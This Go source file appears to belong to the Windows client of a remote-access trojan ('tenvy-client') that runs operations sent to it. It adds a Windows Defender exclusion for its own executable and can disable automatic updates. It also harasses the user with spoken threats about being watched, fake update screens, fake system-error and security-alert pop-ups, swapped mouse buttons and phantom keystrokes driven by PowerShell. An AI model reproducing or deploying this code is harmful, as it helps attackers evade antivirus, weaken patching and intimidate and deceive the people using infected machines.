//go:build windows

package options

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	winoptions "github.com/rootbay/tenvy-client/internal/platform/windows/options"
)

type windowsPlatformService struct{}

var (
	configureColorFilterFunc = winoptions.ConfigureColorFilter
	configureCursorStateFunc = winoptions.ConfigureCursorState
)

func newPlatformService() PlatformService {
	return &windowsPlatformService{}
}

func (s *windowsPlatformService) Execute(
	ctx context.Context,
	operation string,
	metadata map[string]any,
	state State,
) (string, error) {
	switch operation {
	case "defender-exclusion":
		enabled := false
		if v, ok := metadata["enabled"].(bool); ok {
			enabled = v
		}

		executable, err := os.Executable()
		if err != nil {
			return "", fmt.Errorf("resolve executable path: %w", err)
		}
		executable = filepath.Clean(executable)

		if enabled {
			if err := winoptions.EnsureProcessExclusion(ctx, executable); err != nil {
				return "", err
			}
			return fmt.Sprintf("Added Defender process exclusion for %s", executable), nil
		}

		if err := winoptions.RemoveProcessExclusion(ctx, executable); err != nil {
			return "", err
		}
		return fmt.Sprintf("Removed Defender process exclusion for %s", executable), nil

	case "windows-update":
		enabled := false
		if v, ok := metadata["enabled"].(bool); ok {
			enabled = v
		}
		if err := winoptions.ConfigureAutomaticUpdates(ctx, enabled); err != nil {
			return "", err
		}
		if enabled {
			return "Enabled Windows Update automatic updates", nil
		}
		return "Disabled Windows Update automatic updates", nil

	case "sound-playback":
		enabled := false
		if v, ok := metadata["enabled"].(bool); ok {
			enabled = v
		}

		targetVolume := state.SoundVolume
		if targetVolume < 0 {
			targetVolume = 0
		}
		if targetVolume > 100 {
			targetVolume = 100
		}

		scalar := 0.0
		if enabled {
			scalar = float64(targetVolume) / 100.0
		}

		if err := winoptions.SetMasterVolumeScalar(scalar); err != nil {
			return "", err
		}
		if enabled {
			return fmt.Sprintf("Restored system playback volume to %d%%", targetVolume), nil
		}
		return "Muted system playback", nil

	case "sound-volume":
		volume := state.SoundVolume
		if raw, ok := metadata["volume"]; ok {
			switch v := raw.(type) {
			case int:
				volume = v
			case int64:
				volume = int(v)
			case uint64:
				volume = int(v)
			case float64:
				volume = int(v)
			case float32:
				volume = int(v)
			}
		}

		if volume < 0 {
			volume = 0
		}
		if volume > 100 {
			volume = 100
		}

		if err := winoptions.SetMasterVolumeScalar(float64(volume) / 100.0); err != nil {
			return "", err
		}
		return fmt.Sprintf("Set system volume to %d%%", volume), nil

	case "visual-distortion":
		mode, _ := metadata["mode"].(string)
		return s.configureVisualDistortion(ctx, mode)

	case "cursor-behavior":
		behavior, _ := metadata["behavior"].(string)
		return s.configureCursorBehavior(ctx, behavior)

	case "screen-orientation":
		orientation, _ := metadata["orientation"].(string)
		if err := winoptions.ConfigureScreenOrientation(ctx, orientation); err != nil {
			return "", err
		}
		return fmt.Sprintf("Set screen orientation to %s", orientation), nil

	case "wallpaper-mode":
		mode, _ := metadata["mode"].(string)
		if err := winoptions.ConfigureWallpaper(ctx, mode); err != nil {
			return "", err
		}
		return fmt.Sprintf("Set wallpaper mode to %s", mode), nil

	case "keyboard-mode":
		mode, _ := metadata["mode"].(string)
		return s.configureKeyboardShenanigans(ctx, mode)

	case "auto-minimize":
		enabled := false
		if v, ok := metadata["enabled"].(bool); ok {
			enabled = v
		}
		if enabled {
			if err := winoptions.MinimizeAllWindows(ctx); err != nil {
				return "", err
			}
			return "Minimized all windows", nil
		}
		return "Auto minimize disabled", nil

	case "speech-spam":
		enabled := false
		if v, ok := metadata["enabled"].(bool); ok {
			enabled = v
		}
		if enabled {
			// One-shot speak for now to confirm it works
			if err := winoptions.SpeakText(ctx, "Speech spam enabled"); err != nil {
				return "", err
			}
			return "Speech spam started", nil
		}
		return "Speech spam disabled", nil

	case "speech-spam-internal":
		phrases := []string{
			"I am watching you.",
			"Do you like what you see?",
			"Windows is updating, please do not turn off your computer.",
			"Security alert: unauthorized access detected.",
			"System optimization in progress. Do not interrupt.",
			"Anomaly detected in user behavior pattern.",
			"Kernel level debugging enabled.",
			"Please maintain eye contact with the webcam.",
			"Your productivity is being logged.",
			"Identity verification required.",
		}
		phrase := phrases[time.Now().Unix()%int64(len(phrases))]
		if err := winoptions.SpeakText(ctx, phrase); err != nil {
			return "", err
		}
		return "Spoke phrase", nil

	case "fake-event-mode":
		mode, _ := metadata["mode"].(string)
		trimmed := strings.ToLower(strings.TrimSpace(mode))
		switch trimmed {
		case "", "none":
			return "Fake event mode cleared", nil
		case "fakeupdate":
			script := `
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.BackColor = 'Black'
$form.TopMost = $true
$label = New-Object Windows.Forms.Label
$label.Text = 'Updating Windows... 32%` + "`n" + `Please do not turn off your computer.'
$label.ForeColor = 'White'
$label.Font = New-Object Drawing.Font('Segoe UI', 24)
$label.Dock = 'Fill'
$label.TextAlign = 'MiddleCenter'
$form.Controls.Add($label)
$form.Add_Click({$form.Close()})
$form.ShowDialog()
`
			go winoptions.RunPowerShell(context.Background(), script)
			return "Fake OS update screen displayed", nil
		case "fakeerror":
			script := `
[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
[Windows.Forms.MessageBox]::Show('A critical system error has occurred. Memory at 0x00401000 could not be read.', 'System Error', [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Error)
`
			go winoptions.RunPowerShell(context.Background(), script)
			return "Fake error message displayed", nil
		case "notificationstorm":
			script := `
$wsh = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 5; $i++) {
    $wsh.Popup("System alert: Unrecognized activity detected.", 0, "Security Warning", 0x10)
}
`
			go winoptions.RunPowerShell(context.Background(), script)
			return "Notification storm initiated", nil
		default:
			return fmt.Sprintf("Fake event mode %s unsupported on Windows", mode), nil
		}
	default:
		return "", nil
	}
}

func (s *windowsPlatformService) configureKeyboardShenanigans(ctx context.Context, mode string) (string, error) {
	normalized := strings.ToLower(strings.TrimSpace(mode))
	switch normalized {
	case "", "none":
		return "Keyboard shenanigans cleared", nil
	case "capsloop":
		script := `
$ErrorActionPreference = 'Stop'
$wsh = New-Object -ComObject WScript.Shell
$wsh.SendKeys('{CAPSLOCK}')
`
		if err := winoptions.RunPowerShell(ctx, script); err != nil {
			return "", err
		}
		return "Toggled Caps Lock", nil
	case "sticky":
		script := `[System.Console]::Beep(440, 200); [System.Console]::Beep(880, 200)`
		if err := winoptions.RunPowerShell(ctx, script); err != nil {
			return "", err
		}
		return "Simulated sticky keys sound", nil
	case "phantomtyping":
		script := `
$ErrorActionPreference = 'Stop'
$wsh = New-Object -ComObject WScript.Shell
$wsh.SendKeys('{SHIFT}')
`
		if err := winoptions.RunPowerShell(ctx, script); err != nil {
			return "", err
		}
		return "Performed phantom typing", nil
	default:
		return fmt.Sprintf("Keyboard mode %s unsupported on Windows", mode), nil
	}
}

func (s *windowsPlatformService) configureVisualDistortion(ctx context.Context, mode string) (string, error) {
	normalized := strings.ToLower(strings.TrimSpace(mode))
	switch normalized {
	case "", "none":
		if err := configureColorFilterFunc(ctx, false, 0); err != nil {
			return "", err
		}
		return "Disabled Windows color filters", nil
	case "invertcolors":
		if err := configureColorFilterFunc(ctx, true, 1); err != nil {
			return "", err
		}
		return "Enabled Windows color inversion filter", nil
	default:
		trimmed := strings.TrimSpace(mode)
		if trimmed == "" {
			trimmed = "unspecified"
		}
		return fmt.Sprintf("Visual distortion %s unsupported on Windows", trimmed), nil
	}
}

func (s *windowsPlatformService) configureCursorBehavior(ctx context.Context, behavior string) (string, error) {
	normalized := strings.ToLower(strings.TrimSpace(behavior))
	switch normalized {
	case "", "normal":
		if err := configureCursorStateFunc(ctx, false, 0); err != nil {
			return "", err
		}
		return "Restored standard cursor behavior", nil
	case "reverse":
		if err := configureCursorStateFunc(ctx, true, 0); err != nil {
			return "", err
		}
		return "Swapped primary and secondary mouse buttons", nil
	case "drift":
		if err := configureCursorStateFunc(ctx, false, 3); err != nil {
			return "", err
		}
		return "Enabled cursor trails for drifting effect", nil
	case "ghost":
		if err := configureCursorStateFunc(ctx, false, 7); err != nil {
			return "", err
		}
		return "Enabled pronounced cursor trails", nil
	default:
		trimmed := strings.TrimSpace(behavior)
		if trimmed == "" {
			trimmed = "unspecified"
		}
		return fmt.Sprintf("Cursor behavior %s unsupported on Windows", trimmed), nil
	}
}
